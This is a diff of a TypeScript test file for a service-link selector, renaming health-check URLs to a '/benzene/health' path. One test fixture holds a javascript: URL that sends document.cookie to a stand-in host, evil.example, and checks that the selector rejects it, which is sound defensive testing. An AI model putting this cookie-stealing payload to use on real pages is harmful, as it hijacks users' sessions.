@@ -19,7 +19,7 @@ const withServices = (manifestUrl?: string) => {
           status: 'healthy',
           contractDrift: false,
           specUrl: 'https://orders-api.example/benzene/spec',
-          healthUrl: 'https://orders-api.example/healthcheck',
+          healthUrl: 'https://orders-api.example/benzene/health',
         },
         { name: 'quiet-api', status: 'healthy', contractDrift: false },
       ],
@@ -79,7 +79,7 @@ describe('service links', () => {
   it('offers the self-reported links only when the manifest supplied them', () => {
     const store = withServices();
     expect(selectServiceLinks(store.getState(), 'orders-api', PAGE).healthHref).toBe(
-      'https://orders-api.example/healthcheck',
+      'https://orders-api.example/benzene/health',
     );
     expect(selectServiceLinks(store.getState(), 'quiet-api', PAGE).rawSpecHref).toBeNull();
   });
@@ -96,7 +96,7 @@ describe('service links', () => {
             status: 'healthy',
             contractDrift: false,
             specUrl: 'javascript:fetch("//evil.example?c="+document.cookie)',
-            healthUrl: 'https://hostile-api.example/healthcheck',
+            healthUrl: 'https://hostile-api.example/benzene/health',
           },
         ],
       }),
@@ -105,7 +105,7 @@ describe('service links', () => {
     const links = selectServiceLinks(store.getState(), 'hostile-api', PAGE);
     expect(links.rawSpecHref).toBeNull();
     // One bad field costs one link, not the whole card.
-    expect(links.healthHref).toBe('https://hostile-api.example/healthcheck');
+    expect(links.healthHref).toBe('https://hostile-api.example/benzene/health');
     expect(links.specViewHref).not.toBeNull();
   });
 
